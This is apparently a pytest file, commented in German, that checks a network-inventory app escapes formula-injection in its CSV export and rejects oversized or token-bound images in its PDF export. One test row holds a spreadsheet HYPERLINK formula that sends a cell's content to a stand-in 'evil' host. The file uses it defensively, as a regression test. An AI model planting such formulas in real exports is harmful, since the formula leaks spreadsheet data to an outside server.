"""W2 S-3 (CSV-Formelinjection) und S-6 (PDF-Bildlimit / Token+Bild)."""

import struct
import zlib

from app.exporters import to_csv


def _png_9000x9000() -> bytes:
    # nur Header genuegt: ImageReader liest die Groesse aus IHDR
    ihdr = struct.pack(">IIBBBBB", 9000, 9000, 8, 2, 0, 0, 0)
    chunk = struct.pack(">I", len(ihdr)) + b"IHDR" + ihdr + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr))
    return b"\x89PNG\r\n\x1a\n" + chunk


def test_csv_prefixes_formula_cells():
    rows = [
        {
            "mac": "aa:bb:cc:dd:ee:ff",
            "ip": "192.0.2.10",
            "hostname": '=HYPERLINK("http://evil/?"&A2,"x")',
            "vendor": "+cmd",
            "category": "Client",
            "status": "online",
            "subnet": "192.0.2.0/24",
            "note": "-bitte pruefen",
            "first_seen": "2026-01-01",
            "last_seen": "2026-01-02",
        }
    ]
    out = to_csv(rows, ";")
    assert "'=HYPERLINK" in out
    assert "'+cmd" in out
    assert "'-bitte pruefen" in out
    assert "aa:bb:cc:dd:ee:ff" in out  # MAC bleibt unberuehrt


def test_pdf_rejects_oversized_image(auth_client):
    import base64

    img = base64.b64encode(_png_9000x9000()).decode()
    r = auth_client.post("/api/export/pdf", json={"image": f"data:image/png;base64,{img}"})
    assert r.status_code == 422  # S-6: 9000x9000 wird vor reportlab abgelehnt


def test_pdf_token_request_rejects_image(auth_client, app):
    import base64

    tok = auth_client.post("/api/tokens", json={"expires_hours": 24}).json()["token"]
    img = base64.b64encode(b"\x89PNG\r\n\x1a\n" + b"\x00" * 64).decode()
    r = auth_client.post("/api/export/pdf", json={"image": f"data:image/png;base64,{img}"}, params={"token": tok})
    assert r.status_code == 422  # S-6: mit Embed-Token kein Bild (DoS-Vektor)
